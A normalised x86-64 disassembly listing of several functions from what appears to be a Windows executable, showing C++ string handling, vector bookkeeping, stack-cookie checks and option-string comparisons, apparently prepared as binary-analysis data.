mov [ rbp + 0x18 ] rdi
mov [ rbp + 0x8 ] di
xor r8d r8d
lea edx [ rdi + 0x9 ]
lea rcx [ rbp + 0x8 ]
call sub_1400025a0
lea r11 [ rbp + 0x8 ]
cmp [ rbp + 0x20 ] 0x8
cmovae r11 [ rbp + 0x8 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
movzx eax [ r--data ]
mov [ r11 + 0x10 ] ax
mov [ rbp + 0x18 ] 0x9
lea rax [ rbp + 0x8 ]
cmp [ rbp + 0x20 ] 0x8
cmovae rax [ rbp + 0x8 ]
mov [ rax + 0x12 ] di
mov [ rbp + 0x48 ] 0x7
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
lea rdx [ rbp ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140030050 ]
mov [ rbp - 0x60 ] r11
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
xor r8d r8d
lea edx [ rdi + 0x8 ]
lea rcx [ rbp - 0x58 ]
call sub_1400025a0
lea r11 [ rbp - 0x58 ]
cmp [ rbp - 0x40 ] 0x8
cmovae r11 [ rbp - 0x58 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov [ rbp - 0x48 ] 0x8
lea rax [ rbp - 0x58 ]
cmp [ rbp - 0x40 ] 0x8
cmovae rax [ rbp - 0x58 ]
mov [ rax + 0x10 ] di
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x41 ]
lea rcx [ rbp - 0x30 ]
call sub_1400025a0
lea rcx [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rcx [ rbp - 0x30 ]
mov r8d 0x82
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp - 0x20 ] 0x41
lea rax [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rax [ rbp - 0x30 ]
mov [ rax + 0x82 ] di
lea rdx [ rbp - 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14002ef30 ]
mov [ rsp + 0x40 ] r11
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
xor r8d r8d
lea edx [ rdi + 0xa ]
lea rcx [ rsp + 0x48 ]
call sub_1400025a0
lea r11 [ rsp + 0x48 ]
cmp [ rsp + 0x60 ] 0x8
cmovae r11 [ rsp + 0x48 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov eax [ r--data ]
mov [ r11 + 0x10 ] eax
mov [ rsp + 0x58 ] 0xa
lea rax [ rsp + 0x48 ]
cmp [ rsp + 0x60 ] 0x8
cmovae rax [ rsp + 0x48 ]
mov [ rax + 0x14 ] di
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
xor r8d r8d
lea edx [ rdi + 0x37 ]
lea rcx [ rsp + 0x70 ]
call sub_1400025a0
lea rcx [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rcx [ rsp + 0x70 ]
lea r8d [ rdi + 0x6e ]
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp - 0x80 ] 0x37
lea rax [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rax [ rsp + 0x70 ]
mov [ rax + 0x6e ] di
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14002efe0 ]
mov [ rbp + 0xc0 ] r11
mov [ rbp + 0xe0 ] 0x7
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
lea r8d [ rdi + 0xc ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xc8 ]
call sub_140001ea0
nop
mov [ rbp + 0x108 ] 0x7
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
lea r8d [ rdi + 0x6c ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xf0 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0xc0 ]
mov rcx rbx
call sub_140018d50
nop
cmp [ rbp + 0x108 ] 0x8
jb r-xdata
mov [ rbp + 0x108 ] 0x7
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xf0 ]
call j_sub_14003ad04
mov [ rbp + 0xe0 ] 0x7
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_14003ad04
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
mov [ rbp + 0x48 ] 0x7
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_14003ad04
mov [ rbp + 0x20 ] 0x7
mov [ rbp + 0x18 ] rdi
mov [ rbp + 0x8 ] di
cmp [ rbp + 0xa8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x8 ]
call j_sub_14003ad04
mov [ rbp + 0xa8 ] 0x7
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x90 ]
call j_sub_14003ad04
mov rax rbx
mov rcx [ rbp + 0x120 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x230 ]
mov rbx [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x68 ]
call j_sub_14003ad04
sub_14002e8b0
mov rax rsp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0xb0
mov [ rsp + 0x40 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
xor r15d r15d
mov [ rsp + 0x20 ] r15
mov [ rsp + 0x28 ] r15
mov [ rsp + 0x30 ] r15
mov r8 [ rcx ]
mov rcx [ rcx + 0x8 ]
sub rcx r8
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
mov edx r15d
cmovne rdx r8
lea rcx [ rsp + 0x20 ]
call sub_1400119d0
mov rbp [ rsp + 0x28 ]
mov r12 [ rsp + 0x20 ]
test al al
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x78 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x90 ] 0x8
jb r-xdata
lea rdx [ r--data ]
lea r14 [ rw-data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
call sub_140007970
cmp r12 rbp
je r-xdata
test r12 r12
je r-xdata
mov rcx [ rsp + 0x78 ]
call j_sub_14003ad04
nop
lea rsi [ r12 + 0x4 ]
lea ebx [ r15 + 0x9 ]
lea r12d [ r15 + 0x20 ]
nop [ rax + rax ] eax
mov al 0x1
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xb0 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
cmp r12 rbp
je r-xdata
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
mov rcx r15
jmp r-xdata
mov rcx r12
call j_sub_14003ad04
lea rbx [ r12 + 0x20 ]
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
mov rcx r15
jmp r-xdata
mov rdx [ rdi + 0x8 ]
call [ rdi ]
mov r11 [ rbx ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rbx + 0x58 ] r12w
mov edx 0xf
lea rcx [ rsp + 0x68 ]
call sub_140039e70
mov rdi rax
mov edx [ rsi ]
mov rcx rbx
call sub_140008400
mov rcx rax
mov edx 0x9
call sub_14000fe50
mov rbx rax
test rax rax
jne r-xdata
mov [ rbx ] 0x7
mov [ rbx - 0x8 ] r15
mov [ rbx - 0x18 ] r15w
add rbx 0x30
lea rax [ rbx - 0x20 ]
cmp rax rbp
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_14003ad04
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx r11
mov rcx r15
jmp r-xdata
mov rdx [ rdi + 0x8 ]
call [ rdi ]
mov r11 [ rbx ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rbx + 0x58 ] r12w
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
and [ rcx + 0x18 ] 0xfffffe7f
or [ rcx + 0x18 ] 0x40
mov rdx r13
mov rcx rbx
call sub_14000ae70
mov r11 rax
test rax rax
jne r-xdata
cmp [ rbx ] 0x8
jb r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
mov rcx [ rcx + rdi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove ebx eax
and [ rcx + 0x18 ] 0xfffffebf
or [ rcx + 0x18 ] 0x80
mov edx 0x9
mov rcx r11
call sub_14000fe50
mov rcx rax
lea rdx [ rsi + 0x4 ]
call sub_14000ae70
mov rdi rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov ebx r15d
mov rcx [ rdi ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rdi + 0x10 ] 0x6
jne r-xdata
cmp [ rsp + 0x90 ] 0x8
jb r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
add rsi 0x30
lea rax [ rsi - 0x4 ]
cmp rax rbp
mov ebx 0x9
jne r-xdata
mov rcx [ rsp + 0x78 ]
call j_sub_14003ad04
xor r8d r8d
call sub_140003120
nop
or edx 0x4
mov edx [ rsi ]
lea rcx [ rsp + 0x78 ]
call sub_140030420
mov r13 rax
mov edx 0x5
lea rcx [ rsp + 0x58 ]
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
add rcx r14
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rw-data ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + r14 + 0x58 ] r12w
mov edx 0x5
lea rcx [ rsp + 0x48 ]
call sub_140039e70
mov rdi rax
mov edx [ rsi - 0x4 ]
mov rcx r14
call sub_140008400
mov rcx rax
movzx edx bx
call sub_14000fe50
mov rbx rax
test rax rax
jne r-xdata
mov r12 [ rsp + 0x20 ]
jmp r-xdata
sub_14002ec20
mov rax rsp
push rsi
push rdi
push r12
push r13
push r15
sub rsp 0xb0
mov [ rsp + 0x40 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov [ rsp + 0x20 ] 0x0
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x30 ] 0x0
mov r8 [ rcx ]
mov rcx [ rcx + 0x8 ]
sub rcx r8
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
mov edx 0x0
cmovne rdx r8
lea rcx [ rsp + 0x20 ]
call sub_140011ba0
mov rbp [ rsp + 0x28 ]
mov r12 [ rsp + 0x20 ]
test al al
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x78 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x90 ] 0x8
jb r-xdata
lea rdx [ r--data ]
lea r13 [ rw-data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
call sub_140007970
cmp r12 rbp
je r-xdata
test r12 r12
je r-xdata
mov rcx [ rsp + 0x78 ]
call j_sub_14003ad04
nop
lea rsi [ r12 + 0x30 ]
mov r15d 0x20
lea r12d [ r15 - 0x17 ]
mov al 0x1
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xb0 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r13
pop r12
pop rdi
pop rsi
retn
mov rdx rbp
mov rcx r12
call sub_1400150b0
mov rcx r12
call j_sub_14003ad04
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
xor ecx ecx
jmp r-xdata
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
xor ecx ecx
jmp r-xdata
mov rdx [ rdi + 0x8 ]
call [ rdi ]
mov r11 [ rbx ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rbx + 0x58 ] r15w
mov edx 0x30
lea rcx [ rsp + 0x68 ]
call sub_140039e70
mov rdi rax
mov edx [ rsi - 0x30 ]
mov rcx rbx
call sub_140008400
mov rcx rax
movzx edx r12w
call sub_14000fe50
mov rbx rax
test rax rax
jne r-xdata
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx r11
xor ecx ecx
jmp r-xdata
mov rdx [ rdi + 0x8 ]
call [ rdi ]
mov r11 [ rbx ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rbx + 0x58 ] r15w
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
and [ rcx + 0x18 ] 0xfffffe7f
or [ rcx + 0x18 ] 0x40
mov rdx rsi
mov rcx rbx
call sub_14000ae70
mov r11 rax
test rax rax
jne r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
mov rcx [ rcx + rdi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove ebx eax
and [ rcx + 0x18 ] 0xfffffebf
or [ rcx + 0x18 ] 0x80
mov edx r12d
mov rcx r11
call sub_14000fe50
mov rcx rax
lea rdx [ rsi - 0x28 ]
call sub_14000ae70
mov rdi rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
xor ebx ebx
mov rcx [ rdi ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rdi + 0x10 ] 0x6
jne r-xdata
add rsi 0x58
lea rax [ rsi - 0x30 ]
cmp rax rbp
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov edx 0x5
lea rcx [ rsp + 0x58 ]
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
add rcx r13
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rw-data ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + r13 + 0x58 ] r15w
mov edx 0x5
lea rcx [ rsp + 0x48 ]
call sub_140039e70
mov rdi rax
mov edx [ rsi - 0x2c ]
mov rcx r13
call sub_140008400
mov rcx rax
movzx edx r12w
call sub_14000fe50
mov rbx rax
test rax rax
jne r-xdata
mov r12 [ rsp + 0x20 ]
jmp r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
sub_14002ef30
push rbx
sub rsp 0x130
mov [ rsp + 0x20 ] 0xfffffffffffffffe
xor ebx ebx
mov [ rsp + 0x140 ] ebx
mov r8 [ rcx ]
mov rcx [ rcx + 0x8 ]
sub rcx r8
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x1
jne r-xdata
xor edx edx
mov rcx rbx
call sub_14002f220
mov al 0x1
add rsp 0x130
pop rbx
retn
mov rdx r8
lea rcx [ rsp + 0x30 ]
call sub_140006e70
nop
lea rdx [ rsp + 0x140 ]
lea rcx [ rsp + 0x30 ]
call sub_14001da90
lea rbx [ rsp + 0x140 ]
lea rcx [ rsp + 0xc8 ]
call sub_140003cd0
lea r11 [ r--data ]
mov [ rsp + 0xc8 ] r11
lea rcx [ rsp + 0xc8 ]
call sub_140037d08
sub_14002efe0
mov rax rsp
push rbp
lea rbp [ rax - 0x68 ]
sub rsp 0x160
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x58 ] rax
mov rdi rcx
xor esi esi
mov [ rsp + 0x24 ] esi
mov ebx esi
mov [ rbp + 0x48 ] 0x7
mov [ rbp + 0x40 ] rsi
mov [ rbp + 0x30 ] si
mov [ rsp + 0x20 ] esi
mov r10 [ rcx ]
mov rcx [ rcx + 0x8 ]
sub rcx r10
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x1
jne r-xdata
cmp rdx 0x2
jne r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r10
lea rcx [ rbp + 0x30 ]
call sub_140001dd0
jmp r-xdata
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rdx r10
lea rcx [ rsp + 0x30 ]
call sub_140006e70
nop
lea rdx [ rsp + 0x24 ]
lea rcx [ rsp + 0x30 ]
call sub_14001da90
lea rbx [ rsp + 0x24 ]
mov rax [ rdi + 0x8 ]
lea rdx [ rax - 0x28 ]
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rbp + 0x30 ]
call sub_140001dd0
nop
lea rcx [ rbp - 0x38 ]
call sub_140003cd0
lea r11 [ r--data ]
mov [ rbp - 0x38 ] r11
lea rcx [ rbp - 0x38 ]
call sub_140037d08
cmp [ rbp + 0x40 ] 0x0
je r-xdata
mov al 0x1
mov rcx [ rbp + 0x58 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x160 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x30 ]
call j_sub_14003ad04
lea rcx [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rcx [ rbp + 0x30 ]
lea rdx [ r--data ]
call sub_14003bad0
test eax eax
jne r-xdata
lea rcx [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rcx [ rbp + 0x30 ]
lea rdx [ r--data ]
call sub_14003bad0
test eax eax
jne r-xdata
mov [ rsp + 0x20 ] esi
jmp r-xdata
lea rcx [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rcx [ rbp + 0x30 ]
lea rdx [ r--data ]
call sub_14003bad0
test eax eax
jne r-xdata
mov [ rsp + 0x20 ] 0x1
jmp r-xdata
lea rdx [ rsp + 0x20 ]
mov rcx rbx
call sub_14002f220
jmp r-xdata
lea rcx [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rcx [ rbp + 0x30 ]
lea rdx [ r--data ]
call sub_14003bad0
test eax eax
jne r-xdata
mov [ rsp + 0x20 ] 0x2
jmp r-xdata
lea rcx [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rcx [ rbp + 0x30 ]
lea rdx [ r--data ]
call sub_14003bad0
test eax eax
jne r-xdata
mov [ rsp + 0x20 ] 0x3
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp + 0x30 ]
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
mov [ rsp + 0x20 ] 0x4
sub_14002f220
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x138 ]
sub rsp 0x210
mov [ rsp + 0x78 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x100 ] rax
mov [ rsp + 0x68 ] rdx
mov [ rsp + 0x70 ] rcx
xor r15b r15b
xor r14d r14d
mov [ rsp + 0x38 ] r14
mov [ rsp + 0x40 ] r14
mov [ rsp + 0x48 ] r14
lea edx [ r14 + 0x1 ]
lea rcx [ rsp + 0x38 ]
call sub_14001ade0
lea eax [ r14 + 0x4 ]
mov rcx [ rsp + 0x40 ]
test rcx rcx
je r-xdata
add rcx rax
mov [ rsp + 0x40 ] rcx
mov [ rbp + 0xf8 ] 0x5
lea rax [ rbp + 0xf8 ]
mov rsi [ rsp + 0x38 ]
cmp rax rcx
jae r-xdata
mov [ rcx ] eax
mov rdi 0x3ffffffffffffffe
mov rbx 0x3fffffffffffffff
mov rdx [ rsp + 0x48 ]
cmp rcx rdx
jne r-xdata
lea rax [ rbp + 0xf8 ]
cmp rsi rax
ja r-xdata
test rcx rcx
je r-xdata
mov r9 rcx
sub r9 rsi
sar r9 0x2
cmp r9 rdi
jbe r-xdata
lea r12 [ rbp + 0xf8 ]
sub r12 rsi
sar r12 0x2
mov rdi 0x3ffffffffffffffe
mov rbx 0x3fffffffffffffff
mov rdx [ rsp + 0x48 ]
cmp rcx rdx
jne r-xdata
add rcx 0x4
mov [ rsp + 0x40 ] rcx
mov [ rbp + 0xf8 ] 0x2
lea rax [ rbp + 0xf8 ]
cmp rax rcx
jae r-xdata
mov [ rcx ] 0x5
inc r9
mov r8 rdx
sub r8 rsi
sar r8 0x2
cmp r9 r8
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test rcx rcx
je r-xdata
mov r9 rcx
sub r9 rsi
sar r9 0x2
cmp r9 rdi
jbe r-xdata
cmp rcx rdx
jne r-xdata
lea rax [ rbp + 0xf8 ]
cmp rsi rax
ja r-xdata
mov rcx r8
shr rcx 0x1
mov rax rbx
sub rax rcx
cmp rax r8
jae r-xdata
mov eax [ rsi + r12 * 4 ]
mov [ rcx ] eax
jmp r-xdata
inc r9
mov r8 rdx
sub r8 rsi
sar r8 0x2
cmp r9 r8
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test rcx rcx
je r-xdata
mov r9 rcx
sub r9 rsi
sar r9 0x2
cmp r9 rdi
jbe r-xdata
lea r12 [ rbp + 0xf8 ]
sub r12 rsi
sar r12 0x2
cmp rcx rdx
jne r-xdata
add r8 rcx
mov r8 r14
jmp r-xdata
mov rcx r8
shr rcx 0x1
mov rax rbx
sub rax rcx
cmp rax r8
jae r-xdata
add rcx 0x4
mov [ rsp + 0x40 ] rcx
mov [ rbp + 0xf8 ] 0x3
lea rax [ rbp + 0xf8 ]
cmp rax rcx
jae r-xdata
mov [ rcx ] 0x2
inc r9
mov r8 rdx
sub r8 rsi
sar r8 0x2
cmp r9 r8
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test rcx rcx
je r-xdata
mov r9 rcx
sub r9 rsi
sar r9 0x2
cmp r9 rdi
jbe r-xdata
cmp r8 r9
cmovb r8 r9
mov rdx r8
lea rcx [ rsp + 0x38 ]
call sub_14001ade0
mov rdx [ rsp + 0x48 ]
mov rcx [ rsp + 0x40 ]
mov rsi [ rsp + 0x38 ]
add r8 rcx
mov r8 r14
jmp r-xdata
cmp rcx rdx
jne r-xdata
lea rax [ rbp + 0xf8 ]
cmp rsi rax
ja r-xdata
mov rcx r8
shr rcx 0x1
mov rax rbx
sub rax rcx
cmp rax r8
jae r-xdata
mov eax [ rsi + r12 * 4 ]
mov [ rcx ] eax
jmp r-xdata
inc r9
mov r8 rdx
sub r8 rsi
sar r8 0x2
cmp r9 r8
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
cmp r8 r9
cmovb r8 r9
mov rdx r8
lea rcx [ rsp + 0x38 ]
call sub_14001ade0
mov rdx [ rsp + 0x48 ]
mov rcx [ rsp + 0x40 ]
mov rsi [ rsp + 0x38 ]
test rcx rcx
je r-xdata
mov rax rcx
sub rax rsi
sar rax 0x2
cmp rax rdi
jbe r-xdata
lea r12 [ rbp + 0xf8 ]
sub r12 rsi
sar r12 0x2
cmp rcx rdx
jne r-xdata
add r8 rcx
mov r8 r14
jmp r-xdata
mov rcx r8
shr rcx 0x1
mov rax rbx
sub rax rcx
cmp rax r8
jae r-xdata
add rcx 0x4
mov [ rsp + 0x40 ] rcx
lea rcx [ rsp + 0x38 ]
call sub_140008330
test al al
je r-xdata
mov [ rcx ] 0x3
inc rax
sub rdx rsi
sar rdx 0x2
cmp rax rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test rcx rcx
je r-xdata
mov rax rcx
sub rax rsi
sar rax 0x2
cmp rax rdi
jbe r-xdata
cmp r8 r9
cmovb r8 r9
mov rdx r8
lea rcx [ rsp + 0x38 ]
call sub_14001ade0
mov rdx [ rsp + 0x48 ]
mov rcx [ rsp + 0x40 ]
mov rsi [ rsp + 0x38 ]
add r8 rcx
mov r8 r14
jmp r-xdata
test rsi rsi
je r-xdata
mov [ rbp + 0xf8 ] 0x74fe3b48
mov [ rbp + 0xfc ] 0x22
mov [ rbp + 0x18 ] 0x7
mov [ rbp + 0x10 ] r14
mov [ rbp ] r14w
mov [ rbp + 0x40 ] 0x7
mov [ rbp + 0x38 ] r14
mov [ rbp + 0x28 ] r14w
mov [ rbp + 0xc0 ] 0x7
mov [ rbp + 0xb8 ] r14
mov [ rbp + 0xa8 ] r14w
xor r8d r8d
lea edx [ r8 + 0xb ]
lea rcx [ rbp + 0xa8 ]
call sub_1400025a0
lea r11 [ rbp + 0xa8 ]
cmp [ rbp + 0xc0 ] 0x8
cmovae r11 [ rbp + 0xa8 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov eax [ r--data ]
mov [ r11 + 0x10 ] eax
movzx eax [ r--data ]
mov [ r11 + 0x14 ] ax
mov [ rbp + 0xb8 ] 0xb
lea rax [ rbp + 0xa8 ]
cmp [ rbp + 0xc0 ] 0x8
cmovae rax [ rbp + 0xa8 ]
mov [ rax + 0x16 ] r14w
mov [ rbp + 0xe8 ] 0x7
mov [ rbp + 0xe0 ] r14
mov [ rbp + 0xd0 ] r14w
xor r8d r8d
lea edx [ r8 + 0xb ]
lea rcx [ rbp + 0xd0 ]
call sub_1400025a0
lea r11 [ rbp + 0xd0 ]
cmp [ rbp + 0xe8 ] 0x8
cmovae r11 [ rbp + 0xd0 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov eax [ r--data ]
mov [ r11 + 0x10 ] eax
movzx eax [ r--data ]
mov [ r11 + 0x14 ] ax
mov [ rbp + 0xe0 ] 0xb
lea rax [ rbp + 0xd0 ]
cmp [ rbp + 0xe8 ] 0x8
cmovae rax [ rbp + 0xd0 ]
mov [ rax + 0x16 ] r14w
lea rdx [ rbp + 0xa8 ]
lea rcx [ rbp ]
call sub_14000eb30
test al al
je r-xdata
mov rcx rdx
shr rcx 0x1
sub rbx rcx
cmp rbx rdx
jae r-xdata
mov eax [ rsi + r12 * 4 ]
mov [ rcx ] eax
jmp r-xdata
inc rax
sub rdx rsi
sar rdx 0x2
cmp rax rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
cmp r8 r9
cmovb r8 r9
mov rdx r8
lea rcx [ rsp + 0x38 ]
call sub_14001ade0
mov rdx [ rsp + 0x48 ]
mov rcx [ rsp + 0x40 ]
mov rsi [ rsp + 0x38 ]
movzx eax r15b
mov rcx [ rbp + 0x100 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x210 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rcx rsi
call j_sub_14003ad04
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0x80 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0x98 ] 0x8
jb r-xdata
mov [ rbp - 0x38 ] 0x7
mov [ rbp - 0x40 ] r14
mov [ rbp - 0x50 ] r14w
mov [ rbp - 0x10 ] 0x7
mov [ rbp - 0x18 ] r14
